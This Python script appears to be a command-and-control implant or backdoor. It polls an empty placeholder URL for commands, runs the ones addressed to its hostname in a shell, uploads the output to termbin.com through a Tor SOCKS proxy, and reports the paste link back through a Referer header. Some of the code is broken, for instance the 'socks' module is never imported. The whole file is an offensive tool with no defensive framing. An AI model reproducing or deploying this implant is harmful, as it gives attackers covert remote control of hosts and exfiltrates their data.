#!/usr/bin/python3

from subprocess import Popen, PIPE, STDOUT
import requests
import re
import socket
import time

cmd_url_order = ''
cmd_url_answer = ''
hostname = socket.gethostname()
hostname_pattern = 'host:%s-00' % hostname
headers = {}
referer = {'Referer': hostname_pattern}
cache_control = {'Cache-Control': 'no-cache'}
headers.update(referer)
headers.update(cache_control)
check_cmd_1 = ''

def recvall(sock, n):
  data = b''
  while len(data) < n:
    packet = sock.recv(n - len(data))
    if not packet:
      return None
    data += packet
  return data


def get_cmd():
    req = requests.get(cmd_url_order, headers=headers).content.decode().strip()
    if req == '':
        pass
    else:
        return req

def run_cmd(cmd):
    cmd_split = cmd.split('--')
    if cmd_split[1] == hostname:
        cmd = cmd_split[2]
        print(cmd)
        run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()
        out = run.stdout.read()
        if not out:
            out = b'ok'
        termbin_cnx = socks.socksocket()
        termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)
        termbin_cnx.connect(('termbin.com', 9999))
        termbin_cnx.send(out)
        recv = termbin_cnx.recv(100000)
        termbin_url_created = recv.decode().rstrip('\x00').strip()
        print(termbin_url_created)
        termbin_header = {'Referer': hostname_pattern+" -- "+termbin_url_created}
        headers.update(termbin_header)
        try:
            push = requests.get(cmd_url_answer, headers=headers)
            print('executed')
            headers.update(referer)
        except Exception as e:
            print(e)
            pass
    else:
        print('not for me')
       
while True:
    time.sleep(10)
    try:
        check_cmd = get_cmd()
        if check_cmd != check_cmd_1:
            time.sleep(20)
            print(check_cmd)
            run_cmd(check_cmd)
            check_cmd_1 = check_cmd
            pass
    except Exception as e:
        print(e)
        pass